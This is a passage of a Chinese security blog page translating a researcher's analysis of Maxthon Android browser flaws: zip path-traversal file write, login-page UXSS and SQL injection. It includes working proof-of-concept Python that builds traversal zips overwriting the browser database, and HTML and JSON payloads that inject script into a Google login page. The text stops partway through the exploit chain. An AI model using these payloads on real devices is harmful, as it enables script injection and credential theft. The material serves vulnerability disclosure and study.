<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
    <title>傲游浏览器任意文件写入, 代码执行, UXSS, SQL注入分析 | MottoIN</title>
    <link rel='dns-prefetch' href='//www.mottoin.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="MottoIN &raquo; 傲游浏览器任意文件写入, 代码执行, UXSS, SQL注入分析评论Feed" href="http://www.mottoin.com/91910.html/feed" />
<link rel='stylesheet' id='stylesheet-css'  href='http://www.mottoin.com/wp-content/themes/JustNews/css/style.css?ver=2.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpcom-qa-css'  href='http://www.mottoin.com/wp-content/plugins/wpcom-qa/css/style.css?ver=1.0' type='text/css' media='all' />
<style id='wpcom-qa-inline-css' type='text/css'>

        .q-content .topic-tab,.q-content .q-answer .as-user,.q-content .q-answer .as-comment-name{color: #1471CA;}
        .q-content .q-topic-wrap a:hover,.q-content .q-answer .as-action a:hover,.q-content .topic-tab:hover{color:#0D62B3;}
        .q-content .put-top,.q-content .topic-tab.current-tab,.q-content .q-answer .as-submit .btn-submit,.q-content .q-answer .as-comments-submit,.q-content .q-add-header .btn-post,.q-content .q-pagination .current{background-color:#1471CA;}
        .q-content .q-answer .as-submit .btn-submit:hover,.q-content .q-answer .as-comments-submit:hover,.q-content .q-add-header .btn-post:hover,.q-content .topic-tab.current-tab:hover,.q-content .q-pagination a:hover{background-color:#0D62B3;}
        .q-content .q-answer .as-comments-input:focus{border-color: #1471CA;}
        
</style>
<link rel='stylesheet' id='um_minified-css'  href='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/css/um.min.css?ver=10.3.88' type='text/css' media='all' />
<script type='text/javascript' src='http://www.mottoin.com/wp-content/themes/JustNews/js/jquery.min.js?ver=1.12.4'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.mottoin.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.mottoin.com/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='WiFi-Pumpkin：无线安全渗透测试套件' href='http://www.mottoin.com/91899.html' />
<link rel='next' title='监听WIFI变化嗅探手机输入' href='http://www.mottoin.com/91945.html' />
<link rel='shortlink' href='http://www.mottoin.com/?p=91910' />
<!--  WPCOM主题相关信息开始 -->
<meta name="applicable-device" content="pc,mobile">
<meta http-equiv="Cache-Control" content="no-transform">
<meta name="keywords" content="SQL注入,UXSS,代码执行,任意文件写入,傲游浏览器">
<meta name="description" content="原文：MaxthonBrowserArbitraryFileWrite,LoginPageUXSS,andSQLInjection原作者：NeilBergman译：Holic(知道创宇404安全实验室)来源：傲游浏览器漏洞系列（上）-任意文件写入，UXSS傲游浏览器漏洞系列（下）-客户端SQL注入和代码执行漏洞译者测试环境：Maxthon4.5.6，Android5.1.1/Android4.2.">
<!--  WPCOM主题相关信息结束 -->
 
		<script type="text/javascript">

		var ultimatemember_image_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-image-upload.php';
		var ultimatemember_file_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-file-upload.php';
		var ultimatemember_ajax_url = 'http://www.mottoin.com/wp-admin/admin-ajax.php';

		</script>

	
		<style type="text/css">.request_name { display: none !important; }</style>

	<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-32x32.jpg" sizes="32x32" />
<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-192x192.jpg" sizes="192x192" />
<link rel="apple-touch-icon-precomposed" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-180x180.jpg" />
<meta name="msapplication-TileImage" content="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-270x270.jpg" />
    <style>
                a,.sec-panel-head span,.list.tabs .tab.active a,.header .nav>li.active>a,.header .dropdown-menu>.active>a,.entry .entry-info .nickname,.entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.comment-body .nickname,.form-submit-text span,.widget_profile .author-title,.um .um-profile-body .um-item-meta a,.login-modal-body .btn-register{color: #08c;}
        .header .dropdown-menu>li>a:hover,.header .dropdown-menu>.active>a:hover,.header .dropdown-menu>.active>a:focus,.navbar-action .publish,.pagination .current,.flex-control-paging li a.flex-active,.form-submit .submit,.sidebar .widget_nav_menu ul li.current-menu-item a,.sidebar .widget_nav_menu ul li.current-post-parent a,.search-form input.submit,.action .contact-title,.pf-submit,.tagHandler ul.tagHandlerContainer li.tagItem,.login-modal-body .btn-login,.woocommerce a.button,.woocommerce button.button,.woocommerce input.button,.woocommerce a.button.alt,.woocommerce button.button.alt,.woocommerce input.button.alt,.woocommerce a.button.alt.disabled,.woocommerce a.button.alt.disabled:hover,.woocommerce a.button.alt:disabled,.woocommerce a.button.alt:disabled:hover,.woocommerce a.button.alt:disabled[disabled],.woocommerce a.button.alt:disabled[disabled]:hover,.woocommerce button.button.alt.disabled,.woocommerce button.button.alt.disabled:hover,.woocommerce button.button.alt:disabled,.woocommerce button.button.alt:disabled:hover,.woocommerce button.button.alt:disabled[disabled],.woocommerce button.button.alt:disabled[disabled]:hover,.woocommerce input.button.alt.disabled,.woocommerce input.button.alt.disabled:hover,.woocommerce input.button.alt:disabled,.woocommerce input.button.alt:disabled:hover,.woocommerce input.button.alt:disabled[disabled],.woocommerce input.button.alt:disabled[disabled]:hover,.woocommerce .widget_price_filter .ui-slider .ui-slider-handle,.woocommerce .widget_price_filter .ui-slider .ui-slider-range,.shopping-count,.social-login-form .sl-input-submit{background-color: #08c;}
        .entry .entry-content h3,.entry .entry-content .h3,.widget-title{border-left-color: #08c;}
        .entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.search-form input.keyword:focus,.widget_profile .author-title,.login-modal-body .btn-login,.login-modal-body .btn-register{border-color: #08c;}
        .entry-bar-inner .author-title:before,.widget_profile .author-title:before{border-right-color: #08c;}
        .list.tabs .tab.active a{border-bottom-color: #08c;}

        a:hover,.header .nav>li>a:hover,.header .nav>li.active>a,.navbar-action .login:hover,.navbar-action .login:focus,.navbar-action .profile a:hover,.navbar-search-icon:hover,.navbar-search-icon:focus,.entry .entry-info a:hover,.entry .entry-info a:focus,.entry-bar .info-item a:hover,.p-item-wrap:hover .title a,.special-item-title a:hover,.special-item-bottom a:hover,.widget ul a:hover,.widget ol a:hover,.sec-panel-head .more:hover,.topic-list .topic-wrap:hover span,.tabs .tab a:hover,
        .article-list .item-title a:hover,.article-list .item-meta a:hover,.article-list .item-meta a:focus,.list-links a:hover,.list-links a:focus,.um .um-profile-body .um-item-meta a:hover,.um .um-profile-body .um-item-link a:hover,.load-more:hover,.login-modal-body .btn-register:hover{color: #07c;}
        .navbar-action .publish:hover,.navbar-action .publish:focus,.entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.pagination a:hover,.flex-control-paging li a:hover,.form-submit .submit:hover,.widget .tagcloud a:hover,.sidebar .widget_nav_menu ul li.current-menu-item .sub-menu a:hover,.sidebar .widget_nav_menu ul li.current-post-parent .sub-menu a:hover,.sidebar .widget_nav_menu ul li a:hover,.search-form input.submit:hover,.action .a-box:hover,.footer-sns .fa:after,.article-list .item-category:hover,.pf-submit:hover,.tagHandler ul.tagHandlerContainer li.tagItem:hover,.login-modal-body .btn-login:hover,.woocommerce a.button:hover,.woocommerce button.button:hover,.woocommerce input.button:hover,.woocommerce a.button.alt:hover,.woocommerce button.button.alt:hover,.woocommerce input.button.alt:hover,.woocommerce .widget_price_filter .price_slider_wrapper .ui-widget-content,.social-login-form .sl-input-submit:hover{background-color: #07c;}
        .entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.widget .tagcloud a:hover,.load-more:hover,.login-modal-body .btn-login:hover,.login-modal-body .btn-register:hover{border-color: #07c;}
        .special-item-bottom a:hover:before{border-left-color: #07c;}
        .list.tabs .tab.active a:hover{border-bottom-color: #07c;}
        @media (max-width: 991px){
            .header .navbar-nav>li.active>a,.header .navbar-nav .dropdown-menu .active a,.header .navbar-nav .dropdown-menu .active .dropdown-menu .active a{color: #08c;}
            .navbar-collapse{background-color: #08c;}
            .dropdown-menu>li a{border-color: #07c;}
            .header .navbar-nav>li.active>a:hover,.header .navbar-nav>li a:hover,.header .navbar-nav .dropdown-menu .active a:hover,.header .navbar-nav .dropdown-menu .active .dropdown-menu a:hover,.header .navbar-nav .dropdown-menu li a:hover{color: #07c;}
        }
        .j-share{position: fixed!important;top: 50%!important;}
                .header .logo img{max-height: 32px;}
                @media (max-width: 767px){
            .header .logo img{max-height: 26px;}
        }
                        .btn-post{
    display: block;
    margin: 0 auto;
    padding: 15px 20px;
    font-size: 16px;
    text-align: center;
    color: #fff !important;
    line-height: 1;
    background: #1471CA;
    -webkit-border-radius: 3px;
    border-radius: 3px;
    text-decoration: none;
    border: 0;
    outline: 0;
}    </style>
    <script> (function() {if (!/*@cc_on!@*/0) return;var e = "abbr, article, aside, audio, canvas, datalist, details, dialog, eventsource, figure, footer, header, hgroup, mark, menu, meter, nav, output, progress, section, time, video".split(', ');var i= e.length; while (i--){ document.createElement(e[i]) } })()</script>
    <!--[if lte IE 8]><script src="http://www.mottoin.com/wp-content/themes/JustNews/js/respond.min.js"></script><![endif]-->
</head>
<body class="post-template-default single single-post postid-91910 single-format-standard">
<header class="header">
    <div class="container clearfix">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
                <span class="icon-bar icon-bar-1"></span>
                <span class="icon-bar icon-bar-2"></span>
                <span class="icon-bar icon-bar-3"></span>
            </button>
            <a class="logo" href="http://www.mottoin.com"><img src="http://www.mottoin.com/img/mottoin/logo.png" alt="MottoIN"></a>
        </div>
        <div class="collapse navbar-collapse">
            <nav class="navbar-left primary-menu"><ul id="menu-%e5%af%bc%e8%88%aa" class="nav navbar-nav"><li class="menu-item menu-item-home"><a href="http://www.mottoin.com/">首页</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/news">资讯</a></li>
<li class="menu-item current-post-ancestor dropdown"><a href="http://www.mottoin.com/category/article" class="dropdown-toggle">文章</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/web">Web安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/system">系统安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/network">网络安全</a></li>
	<li class="menu-item current-post-ancestor current-menu-parent current-post-parent"><a href="http://www.mottoin.com/category/article/terminal">终端安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/database">数据安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/wireless">无线安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/social">社会工程</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/intranet">内网渗透</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/code">代码审计</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/reverse">逆向破解</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/tools">工具</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/geek">极客</a></li>
<li class="menu-item dropdown"><a href="http://www.mottoin.com/category/sole" class="dropdown-toggle">独家</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/topic">专题</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/people">人物</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/view">观点</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/events">活动</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/video">视频</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/hr">招聘</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/forum">社区</a></li>
</ul></nav>            <div class="navbar-action pull-right">

                                    <form class="navbar-search" action="http://www.mottoin.com" method="get" role="search">
                        <input type="text" name="s" class="navbar-search-input" autocomplete="off" placeholder="输入关键词搜索..." value="">
                        <a class="navbar-search-icon j-navbar-search" href="javascript:;"></a>
                    </form>

                    
                    <div id="j-user-wrap">
                        <a class="login" href="http://www.mottoin.com/login">登录</a>
                        <a class="login" href="http://www.mottoin.com/register">注册</a>
                    </div>
                    <a class="publish" href="http://www.mottoin.com/post">
                        投稿</a>
                                                </div>
        </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
</header>
<div id="wrap">    <div class="main container">
        <div class="content">
                            <article id="post-91910" class="post-91910 post type-post status-publish format-standard has-post-thumbnail hentry category-terminal tag-sql tag-uxss tag-1034 tag-1878 tag-1877">
                    <div class="entry">
                        <div class="entry-head">
                            <h1 class="entry-title">傲游浏览器任意文件写入, 代码执行, UXSS, SQL注入分析</h1>
                            <div class="entry-info">
                                                                <a class="nickname" href="http://www.mottoin.com/user/seceditor/">Moto</a>
                                <span class="dot">•</span>
                                <span>2016年11月15日</span>
                                <span class="dot">•</span>
                                <a href="http://www.mottoin.com/category/article/terminal" rel="category tag">终端安全</a>                                                                    <span class="dot">•</span>
                                    <span>阅读 1217</span>
                                                            </div>
                        </div>
                                                                        <div class="entry-content clearfix">
                            <blockquote><p>原文：<a href="http://d3adend.org/blog/?p=851">Maxthon Browser Arbitrary File Write, Login Page UXSS, and SQL Injection</a></p>
<p>原作者：Neil Bergman</p>
<p>译：Holic (知道创宇404安全实验室)</p>
<p>来源：</p>
<ul>
<li><a href="http://paper.seebug.org/108/">傲游浏览器漏洞系列（上）- 任意文件写入，UXSS</a></li>
<li><a href="http://paper.seebug.org/109/">傲游浏览器漏洞系列（下）- 客户端 SQL 注入和代码执行漏洞</a></li>
</ul>
<p>译者测试环境：Maxthon 4.5.6，Android 5.1.1 / Android 4.2.2</p></blockquote>
<h2>前言</h2>
<p><a href="https://play.google.com/store/apps/details?id=com.mx.browser&amp;hl=en">Maxthon Browser（傲游浏览器）</a> 又是一个当下比较流行的 Android 浏览器，未使用Android 的 stock 浏览器（AOSP）。我在 Android 版的浏览器中发现了一些有趣的甚至有些严重的漏洞，可能导致远程代码执行和信息泄漏。</p>
<h2>漏洞要点</h2>
<ul>
<li>暴露的 JavaScript 接口导致任意文件写入 &#8211; 恶意网页可以强制浏览器下载zip文件，浏览器将其放在 SD 卡上，然后通过调用带有 URL 参数的installWebApp方法解压缩。由于缺少对 zip 文件所包含的文件名进行输入验证，攻击者可以制作一个恶意的 zip 文件，造成路径穿越来覆盖浏览器沙盒中的任意文件。这个漏洞能被用来实现远程代码执行，相关内容我将在后面演示。</li>
<li>登录页面暴露的 JavaScript 接口可以进行 UXSS 攻击 &#8211; 恶意网页可以通过调用 catchform 方法更改与其他域关联的自动填充登录页面表单数据。使用一些动态构建的 JS 代码，将自动登录信息注入到登录页面，而且浏览器没有正确输出编码数据，因此我们可以利用这一点开展登录页面的 UXSS 攻击。</li>
<li>暴露的 JavaScript 接口允许将 SQL 语句注入到客户端的 SQLite 数据库 &#8211; 设计为保存自动填充表单信息的代码也易受 SQL 注入攻击。它可能破坏客户端数据库或者远程提取自动填充表中所有信息，包括保存的登录凭据。虽然我能够找到一些在 Android 应用程序中由 IPC 触发的客户端 SQL 注入漏洞的例子（例如来自Dominic Chell的此类<a href="https://www.mdsec.co.uk/2015/11/sql-injection-in-samsung-voice-framework-application/">漏洞</a>），和一个由来自 Baidu X-Team <a href="https://www.exploit-db.com/exploits/35382/">WAP 推送</a>触发的客户端 SQL 注入的例子。我目前找不到有关在 Android 平台从 SQLite 远程窃取数据的公开实例。因此，这可能是针对 Android 应用程序的远程客户端 SQL 注入的第一个公开实例，其中可以使用登录页面， UXSS exploit 作为外部通信技术将数据从 SQLite 数据库中窃取出来。如果有其他有趣的例子，请 Ping 我。</li>
</ul>
<h2>JS 接口攻击面</h2>
<p>傲游浏览器使用 <a href="https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)">addJavascriptInterface</a> 方法将多个 Java 对象注入到加载网页的 Webview 中。在旧的设备（系统版本低于4.2）上，可以轻而易举地远程执行代码，参照：<a href="http://d3adend.org/blog/?p=314">gain RCE by abusing reflection(pix)</a>。在新的设备上，我们必须探索与 JS 接口相关的每个暴露的方法，来寻找可能被利用的有趣功能。</p>
<p>这个应用程序的 JS 接口攻击面很大，这使我们的工作变得更简单或者更难，就取决于你如何看待这个问题了。请考虑以下真实情况：所有的 Java 方法都通过 傲游浏览器暴露给网页中不受信任的 JS 代码。</p>
<p><strong>译者注</strong>： 我们在逆向 Android 程序的时候，比如此例是浏览器应用，我们可以先在逆向工具中搜索一些敏感的方法/函数，像 jsCall这种会涉及到与 js 交互断点方法，getContent 这种与文件内容有交互的方法等。</p>
<p>在 JEB 中，善用其强大的反编译和搜索功能：</p>
<p><img class="alignnone size-full wp-image-91913 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/1111.png" alt="1111" width="264" height="129" /></p>
<p><img class="alignnone size-full wp-image-91914 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/2222.png" alt="2222" width="281" height="133" /></p>
<ul>
<li>com.mx.jsobject.AppcenterLocalImpl<br />
Methods: jsCall</li>
<li>com.mx.browser.navigation.reader.ca<br />
Methods: getContent</li>
<li>com.mx.jsobject.JsObjAppcenter<br />
Methods: jsCall</li>
<li>com.mx.jsobject.JsObjAutoFill<br />
Methods: catchform, enableAutoFill, getLoginButtonSignatureCodes, getNonLoginButtonSignatureCodes, * getNonUsernameSignatureCodes, getTest, getUsernameSignatureCodes</li>
<li>com.mx.jsobject.JsObjGuestSignIn<br />
Methods: getPostUrl, signin</li>
<li>com.mx.jsobject.JsObjMxBrowser<br />
Methods: addLauncherShortcut, getAndroidId, getChannelId, getCountry, getDeviceId, getDeviceType, * getEncodedDeviceCloudId, getLanguage, getMxLang, getObjectName, getPlatformCode, getSysReleaseVersion, * getVersionCode, getVersionName, installWebApp, isAutoLoadImage, isSupportTimeLine, shareMsgToWXTimeLine, * shareToAll, shareToSinaWeibo, shareToSinaWeibo, shareToWXTimeLine, shareToWeChatTimeLine</li>
<li>com.mx.jsobject.JsObjNextPage<br />
Methods: notifyFoundNextPage</li>
<li>com.mx.browser.readmode.JsObjReadDetect<br />
Methods: notifyReadModeSuccess</li>
<li>com.mx.browser.readmode.JsObjReadNext<br />
Methods: notifyReadModeFail, notifyReadModeSuccess</li>
<li>com.mx.jsobject.JsObjShareHelper<br />
Methods: shareTo</li>
<li>com.mx.jsobject.JsTouchIconExtractor<br />
Methods: onReceivedTouchIcons</li>
<li>com.mx.browser.readmode.ReadModeActivity$JsObjReadHtml<br />
Methods: changeColorMode, getHtml, notifyFontSizeChanged, pageDown</li>
<li>com.mx.browser.navigation.reader. RssNewsReaderActivity$ReaderForLocalClientView$JsObjRssReader<br />
Methods: getAuthor, getContent, getObjectName, getSource, getTime, getTitle, loadImage, openImageBrowser</li>
<li>com.mx.browser.navigation.reader. RssNewsReaderActivity$ReaderForPushClientView$JsObjRssReader<br />
Methods: getAuthor, getContent, getSouce, getTime, getTitle</li>
</ul>
<h2>寻找任意文件写入漏洞</h2>
<p>在反编译代码中查看了很多暴露的方法，我看到了一个叫 installWebApp 的方法。</p>
<pre>@JavascriptInterface public void installWebApp(String arg4) {
 String v0 = t.a(arg4);
 p.a(arg4, "/sdcard/webapp/" + v0, null);
 u.b("/sdcard/webapp/" + v0);
 d.b().a();
 Toast.makeText(this.mContext, "webapp installed", 1).show();
 }</pre>
<p>然后我继续审计由 installWebApp 方法调用的所有方法的反编译代码。</p>
<ol>
<li>com.mx.c.t 的一个方法是将 URL 转换为文件名。比如，如果你向该方法中提供 http://www.example.org/blah.zip，则它返回 blah.zip。</li>
<li>com.mx.browser.f.p 的 a 方法使用 Apache HttpClient 下载所提供的 URL，然后使用所提供的文件名（/sdcard/webapp/[zip filename]）保存该文件。</li>
<li>com.mx.c.u 的 b 方法使用 <a href="https://developer.android.com/reference/java/util/zip/ZipFile.html">ZipFile</a>和<a href="https://developer.android.com/reference/java/util/zip/ZipEntry.html">ZipEntry</a>解压 SD 卡上的文件，相关类的代码如下所示。注意 zip 没有针对每条文件名的输入验证。</li>
</ol>
<pre>public static void b(String arg8) {
 File v4;
 Object v0_2;
 try {
 File v0_1 = new File(arg8);
 String v1 = arg8.substring(0, arg8.length() - 4);
 new File(v1).mkdir();
 System.out.println(v1 + " created");
 ZipFile v2 = new ZipFile(v0_1);
 Enumeration v3 = v2.entries();
 do {
 label_20:
 if(!v3.hasMoreElements()) {
 return;
 }

v0_2 = v3.nextElement();
 v4 = new File(v1, ((ZipEntry)v0_2).getName());
 v4.getParentFile().mkdirs();
 }
 while(((ZipEntry)v0_2).isDirectory());

System.out.println("Extracting " + v4);
 BufferedInputStream v5 = new BufferedInputStream(v2.getInputStream(((ZipEntry)v0_2)));
 byte[] v0_3 = new byte[1024];
 BufferedOutputStream v4_1 = new BufferedOutputStream(new FileOutputStream(v4), 1024);
 while(true) {
 int v6 = v5.read(v0_3, 0, 1024);
 if(v6 == -1) {
 break;
 }

v4_1.write(v0_3, 0, v6);
 }

v4_1.flush();
 v4_1.close();
 v5.close();
 goto label_20;
 }
 catch(IOException v0) {
 System.out.println("IOError :" + v0);
 }
 }</pre>
<p>这时，我停止了逆向这个方法，因为很明显加载到浏览器中的恶意网页可能会使应用程序下载并解压放在攻击者服务器上的 zip 文件。而且由于缺少对 zip 每条文件名的输入验证，我们可以穿越路径来覆盖浏览器可以访问到的任意文件。</p>
<h2>利用任意文件写入漏洞第一部分 &#8211; 一个简单的 PoC</h2>
<p>首先，我们需要使用以下 Python 代码构建恶意 zip 文件。 此处仅供参考，这里假设 /sdcard/ 已经软链接至 /storage/emulated/legacy/ 目录。最后 ，浏览器将 maxFileWriteTest.txt 写入到 /storage/emulated/legacy/webapp/maxFileWriteTest9843/../../../data/data/com.mx.browser/maxFileWriteTest.txt 文件, 相当于/data/data/com.mx.browser/maxFileWriteTest.txt。</p>
<pre>import zipfile 
import sys

if __name__ == "__main__": 
 try:
 with open("maxFileWriteTest.txt", "r") as f:
 binary = f.read()
 zipFile = zipfile.ZipFile("maxFileWriteTest9843.zip", "a", zipfile.ZIP_DEFLATED)
 info = zipfile.ZipInfo("maxFileWriteTest9843.zip")
 zipFile.writestr("../../../../../data/data/com.mx.browser/files/maxFileWriteTest.txt", binary)
 zipFile.close()
 except IOError as e:
 raise e</pre>
<p>然后我们使用 unzip 命令列出归档文件，以验证是否正确创建了 zip 文件。看起来效果不错。</p>
<pre>$ unzip -l maxFileWriteTest9843.zip
Archive: maxFileWriteTest9843.zip 
 Length Date Time Name
 -------- ---- ---- ----
 4 02-11-16 15:38 ../../../../../data/data/com.mx.browser/files/maxFileWriteTest.txt
 -------- -------
 4 1 file</pre>
<p>Ok，现在构建的恶意页面，强行让浏览器使用 installWebApp方法下载并解压了我们的文件。</p>
<pre>&lt;html&gt; 
&lt;body&gt; 
&lt;script&gt; 
mmbrowser.installWebApp("http://d3adend.org/test/maxFileWriteTest9843.zip"); 
&lt;/script&gt; 
&lt;/body&gt; 
&lt;/html&gt;</pre>
<p>当浏览器访问恶意页面时，“webapp” 会自动安装。检查 /data/data/com.mx.browser/files 目录，显然我们可以将任意文件写入浏览器的应用程序目录。对受害者来说，唯一可能会察觉的迹象是一个弹出状态信息，告诉用户 “webapp installed”。</p>
<p><img class="alignnone size-full wp-image-91916 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/max.png" alt="max" width="406" height="816" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/max.png 406w, http://www.mottoin.com/wp-content/uploads/2016/11/max-149x300.png 149w" sizes="(max-width: 406px) 100vw, 406px" /></p>
<p>—— 文件写入 /data/data/com.mx.browser/files 路径。</p>
<h2>寻找登录页面的 UXSS 漏洞</h2>
<p>构建这个漏洞页面所需的就是将包含目标 URL，用户名和密码的 JSON payload 传递给 mxautofill 的 catchform 方法，如下面的 HTML 和 JavaScript 代码所示。</p>
<pre>&lt;html&gt; 
&lt;body&gt; 
&lt;script&gt; 
var json = '{"documentURI":"https://accounts.google.com/","inputs":[{"id":"username","name":"username","value":"loginxsstest@gmail.com"},{"id":"password","name":"password","value":"fakepassword\'-alert(\'LoginUXSS:\'+document.domain)-\'"}]}'; 
mxautofill.catchform(json); 
&lt;/script&gt; 
&lt;/body&gt; 
&lt;/html&gt;</pre>
<p>当用户访问恶意页面时，系统会提示用户“save your account?”，并且用户必须点击 ”Yes“ ，浏览器才回保存自动填充信息。用户授权时会把它当做当前域的自动填充信息，而不是在其他任何域下。</p>
<p><img class="alignnone size-full wp-image-91918 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/account.png" alt="account" width="768" height="1280" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/account.png 768w, http://www.mottoin.com/wp-content/uploads/2016/11/account-180x300.png 180w, http://www.mottoin.com/wp-content/uploads/2016/11/account-614x1024.png 614w" sizes="(max-width: 768px) 100vw, 768px" /></p>
<p>—— 受害者被提示”Save your account？“</p>
<p>下次受害者访问 Google 登录页面时，浏览器通过 com.mx.browser.a.e 类中的 WebView 的 loadUrl 方法将以下 JavaScript 插入到页面中。</p>
<pre>javascript:mx_form_fill('loginxsstest@gmail.com' , 'fakepassword'-
alert('LoginUXSS:'+document.domain)-'')</pre>
<p>然后在 accounts.goolge.com 的页面会显示弹出窗口信息。</p>
<p><img class="alignnone size-full wp-image-91920 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/IMG2.png" alt="img2" width="768" height="1280" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/IMG2.png 768w, http://www.mottoin.com/wp-content/uploads/2016/11/IMG2-180x300.png 180w, http://www.mottoin.com/wp-content/uploads/2016/11/IMG2-614x1024.png 614w" sizes="(max-width: 768px) 100vw, 768px" /></p>
<p>—— 我们的 JavaScript 在 Google 的登录页面得以执行</p>
<h2>任意文件写入二 —— 覆盖数据库以便不需要用户交互即可触发 UXSS</h2>
<p>通常利用登录页面进行 UXSS 需要一些用户交互，因为受害者需要对”save your account？“ 提示弹窗点击 ”Yes“，但是鉴于存在任意文件写入漏洞，我们可以配合漏洞在没有用户交互的情况下施展攻击链，参考以下步骤。</p>
<ol>
<li>创建包含多个主流域名的自动填充信息的 SQLite 数据库（mxbrowser_default.db）。同样地，我们将在用户名字段注入我们的 JavaScript 代码。</li>
<li>创建一个 zip 文件，利用目录穿越来覆盖浏览器的 SQLite 数据库（mxbrowser_default.db）。</li>
<li>欺骗受害者浏览器浏览到能够触发 installWebApp 方法的恶意页面，这会让受害者的浏览器自动下载并解压缩我们的 zip 文件。此时，受害者的 SQLite 数据库将替换为我们制作的数据库。</li>
<li>下一次受害者访问其中一个域名的登录页面时，我们的 JavaScript 代码将会注入到页面中。</li>
</ol>
<p>我仅从我的设备（/data/data/com.mx.browser/databases/mxbrowser_default.db）中提取出相关的 SQLite 数据库，并使用 SQLite 客户端修改了 mxautofill 表。</p>
<p><img class="alignnone size-full wp-image-91922 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/maxFileWrtLoginUXSS4325-0.png" alt="maxfilewrtloginuxss4325-0" width="1488" height="100" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/maxFileWrtLoginUXSS4325-0.png 1488w, http://www.mottoin.com/wp-content/uploads/2016/11/maxFileWrtLoginUXSS4325-0-300x20.png 300w, http://www.mottoin.com/wp-content/uploads/2016/11/maxFileWrtLoginUXSS4325-0-768x52.png 768w, http://www.mottoin.com/wp-content/uploads/2016/11/maxFileWrtLoginUXSS4325-0-1024x69.png 1024w" sizes="(max-width: 1488px) 100vw, 1488px" /></p>
<p>&#8212; 在多个域名的用户名字段中包含了 XSS payload 恶意 SQLite 数据库</p>
<p>我们可以使用以下 Python 代码来构建 zip 文件，</p>
<pre>import zipfile 
import sys

if __name__ == "__main__": 
 try:
 with open("mxbrowser_default.db", "r") as f:
 binary = f.read()
 zipFile = zipfile.ZipFile("maxFileWriteToLoginUXSS6324.zip", "a", zipfile.ZIP_DEFLATED)
 zipFile.writestr("../../../../../data/data/com.mx.browser/databases/mxbrowser_default.db", binary)
 zipFile.close()
 except IOError as e:
 raise e</pre>
<p>然后我们制作调用了 installWebApp 方法的 HTML 页面。</p>
<pre>&lt;html&gt; 
&lt;body&gt; 
&lt;script&gt; 
mmbrowser.installWebApp("http://d3adend.org/test/maxFileWriteToLoginUXSS6324.zip"); 
&lt;/script&gt; 
&lt;/body&gt; 
&lt;/html&gt;</pre>
